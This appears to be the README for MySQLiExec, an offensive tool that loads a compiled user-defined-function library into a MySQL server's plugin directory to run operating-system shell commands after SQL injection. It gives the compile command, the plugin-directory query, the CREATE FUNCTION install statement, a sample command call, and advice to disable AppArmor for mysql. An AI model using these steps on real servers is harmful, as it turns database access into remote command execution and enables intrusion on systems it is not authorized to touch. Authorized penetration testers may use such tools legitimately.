# MySQLiExec
mssql's cmdexec-like for mysql, useful when exploiting sql injection on a mysql server.

Description: Write the compiled library to the plugins directory of mysql & load it to be able to run shell commands just like mssql's cmdexec

Compile Example: 
```bash
gcc -fPIC -Wall -I/usr/include/mysql -shared -o sqliexec.so sqliexec.c // on ubuntu with installed headers
```

Find Plugin DIR: 
```sql
SHOW VARIABLES LIKE '%plugin%';
```

Install: 
```sql
CREATE FUNCTION sqliexec RETURNS STRING SONAME 'sqliexec.so';
```

Run: 
```sql
SELECT sqliexec('whoami');
```

Notes: make sure AppArmor is turned off for mysql on linux machines

Author: Kasif Dekel

Version: 1.0
